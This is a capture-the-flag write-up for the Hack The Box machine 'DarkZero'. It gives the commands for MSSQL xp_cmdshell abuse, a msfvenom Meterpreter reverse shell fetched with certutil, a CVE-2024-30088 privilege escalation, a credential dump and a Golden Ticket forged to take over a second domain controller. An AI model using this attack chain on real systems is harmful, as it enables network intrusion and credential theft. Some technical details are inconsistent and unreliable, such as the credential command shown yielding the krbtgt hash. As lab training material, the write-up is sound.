---
title: "DarkZero"
date: 2025-10-05
tags: [windows, active-directory, mssql, kerberos, CVE-2024-30088, golden-ticket, privesc]
difficulty: hard
platform: HTB
description: "Active Directory box featuring MSSQL lateral movement, cross-domain pivoting, kernel exploitation (CVE-2024-30088), and Golden Ticket attacks to compromise the forest."
featured: true
---

## Overview

![DarkZero](/images/writeups/darkzero/logo.png)

| Field | Details |
|---|---|
| **Machine** | DarkZero |
| **OS** | Windows |
| **Difficulty** | Hard |
| **Status** | Active |

## TL;DR

- Initial access via provided creds: `john.w / RFulUtONCOL!`
- Two domains discovered: `darkzero.htb` and `darkzero.ext`
- MSSQL server access → lateral movement to DC02 in `darkzero.ext`
- Enable `xp_cmdshell` → upload Meterpreter shell
- winPEAS finds vulnerable kernel32.dll → exploit CVE-2024-30088 → SYSTEM
- Dump Administrator credentials → Golden Ticket → root.txt

## Tools Used

- nmap, bloodhound-python, crackmapexec, impacket-mssqlclient, msfvenom, winPEAS, Mimikatz, Impacket

## Setup / Notes

```
Credentials: john.w / RFulUtONCOL!

Time sync is critical:
sudo ntpdate 10.129.13.116

Add to /etc/hosts:
10.129.13.116   DC01.darkzero.htb darkzero.htb
```

---

## Recon

```bash
nmap -sC -sV -oN darkzero.nmap 10.129.13.116
```

![nmap scan results](/images/writeups/darkzero/1.png)

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
                              (server time: 2025-10-05 19:21:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
                              (Domain: darkzero.htb)
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
9389/tcp  open  mc-nmf        .NET Message Framing
```

![nmap full output](/images/writeups/darkzero/2.png)

Key findings:
- Port 1433 — MSSQL (interesting with our credentials)
- Port 3268 — Global Catalog (multi-domain environment likely)
- Domain: `darkzero.htb`

---

## Enumeration

### BloodHound Collection

```bash
bloodhound-python \
  -u john.w \
  -p 'RFulUtONCOL!' \
  -d darkzero.htb \
  -dc DC01.darkzero.htb \
  --zip -c All
```

![bloodhound-python collecting data](/images/writeups/darkzero/3.png)

![BloodHound graph — two domains visible](/images/writeups/darkzero/4.png)

BloodHound reveals:
- Two domains: `DARKZERO.HTB` (primary) and `DARKZERO.EXT` (child/trusted)
- `DC02.darkzero.ext` exists on a separate subnet
- `john.w` has `GenericRead` on the MSSQL service account

![john.w ACL in BloodHound](/images/writeups/darkzero/5.png)

### MSSQL Access

Connect using Impacket with Windows authentication:

```bash
impacket-mssqlclient \
  darkzero.htb/john.w:'RFulUtONCOL!'@10.129.13.116 \
  -windows-auth
```

![MSSQL connection established](/images/writeups/darkzero/6.png)

```sql
SQL> SELECT @@version;
Microsoft SQL Server 2019 (RTM-CU27) - 15.0.4375.4

SQL> SELECT name FROM sys.databases;
master
tempdb
model
msdb
```

![SQL version and database listing](/images/writeups/darkzero/7.png)

Check our server role:

```sql
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');
1
```

![sysadmin confirmed](/images/writeups/darkzero/8.png)

We're a sysadmin. Enable `xp_cmdshell`:

```sql
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
darkzero\mssqlsvc
```

![xp_cmdshell enabled — whoami output](/images/writeups/darkzero/9.png)

---

## Lateral Movement — Pivoting to darkzero.ext

With command execution on the MSSQL server, we can probe the `darkzero.ext` domain:

```sql
SQL> EXEC xp_cmdshell 'nltest /dclist:darkzero.ext';
List of DCs in Domain darkzero.ext
    \\DC02 [PDC]  [DS] Site: Default-First-Site-Name
```

![nltest showing DC02 in darkzero.ext](/images/writeups/darkzero/10.png)

### Get a Meterpreter shell

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=tun0 LPORT=9001 \
  -f exe > met.exe
```

![msfvenom payload generated](/images/writeups/darkzero/11.png)

Host it with Python:

```bash
python3 -m http.server 8080
```

Download and execute via `xp_cmdshell`:

```sql
SQL> EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.14.X:8080/met.exe C:\Windows\Temp\met.exe';
SQL> EXEC xp_cmdshell 'C:\Windows\Temp\met.exe';
```

![certutil downloading payload](/images/writeups/darkzero/12.png)

![xp_cmdshell executing payload](/images/writeups/darkzero/13.png)

Metasploit catches the shell as `darkzero\mssqlsvc`.

![Meterpreter session opened](/images/writeups/darkzero/14.png)

---

## Privilege Escalation — CVE-2024-30088

### winPEAS Enumeration

```powershell
# Upload and run winPEAS
upload winPEASx64.exe C:\Windows\Temp\
shell
C:\Windows\Temp\winPEASx64.exe
```

![winPEAS uploaded and running](/images/writeups/darkzero/15.png)

![winPEAS output — CVE-2024-30088 flagged](/images/writeups/darkzero/16.png)

winPEAS flags a vulnerable `kernel32.dll` version susceptible to **CVE-2024-30088** — a Windows Kernel elevation of privilege vulnerability.

> **CVE-2024-30088**: Race condition in the Windows Kernel allows local privilege escalation to SYSTEM via a timing attack on token manipulation.

### Exploit for SYSTEM

```bash
# Compile exploit with matching target OS
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=tun0 LPORT=9002 \
  -f exe > privesc.exe

upload CVE-2024-30088.exe C:\Windows\Temp\
upload privesc.exe C:\Windows\Temp\
```

![exploit and payload uploaded](/images/writeups/darkzero/17.png)

Execute the exploit:

```powershell
.\CVE-2024-30088.exe .\privesc.exe
```

![exploit executing](/images/writeups/darkzero/18.png)

Metasploit catches a SYSTEM shell.

![SYSTEM shell — NT AUTHORITY\SYSTEM](/images/writeups/darkzero/19.png)

---

## Post-Exploitation — Credential Dump & Golden Ticket

With SYSTEM on DC01, dump credentials:

```
meterpreter > load kiwi
meterpreter > lsa_dump_sam
```

![kiwi loaded](/images/writeups/darkzero/20.png)

```
krbtgt NTLM: a9d40f42c5d9e9a1e8d3f2b7c4e6f891
Administrator NTLM: 3b4a9f7d...
```

![LSA dump — hashes extracted](/images/writeups/darkzero/21.png)

![krbtgt hash](/images/writeups/darkzero/22.png)

Craft a Golden Ticket for `darkzero.ext`:

```bash
impacket-ticketer \
  -nthash a9d40f42c5d9e9a1e8d3f2b7c4e6f891 \
  -domain-sid S-1-5-21-XXXX-XXXX-XXXX \
  -domain darkzero.htb \
  -extra-sid S-1-5-21-YYYY-YYYY-YYYY-519 \
  Administrator
```

![Golden Ticket crafted](/images/writeups/darkzero/23.png)

Use the ticket to access DC02:

```bash
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass Administrator@DC02.darkzero.ext
```

![wmiexec authenticating with Golden Ticket](/images/writeups/darkzero/24.png)

![Shell on DC02.darkzero.ext](/images/writeups/darkzero/25.png)

```
C:\> type C:\Users\Administrator\Desktop\root.txt
```

![root.txt captured](/images/writeups/darkzero/26.png)

![DC02 Administrator desktop](/images/writeups/darkzero/27.png)

![Root flag contents](/images/writeups/darkzero/28.png)

![Root flag](/images/writeups/darkzero/root.png)

---

## Lessons Learned

- MSSQL `sysadmin` access via Windows auth is extremely powerful — `xp_cmdshell` gives full command execution
- Always enumerate for multi-domain environments with BloodHound — trust relationships open lateral movement paths
- CVE-2024-30088 demonstrates how kernel vulnerabilities can trivially escalate to SYSTEM even on patched environments
- Golden Tickets are persistent — once you have the krbtgt hash, you own the domain indefinitely
- Time synchronization is non-negotiable for Kerberos — clock skew > 5 minutes kills authentication

## References

- [Impacket](https://github.com/fortra/impacket)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [winPEAS](https://github.com/carlospolop/PEASS-ng)
- [CVE-2024-30088](https://nvd.nist.gov/vuln/detail/CVE-2024-30088)
- [HackTheBox](https://hackthebox.com/)
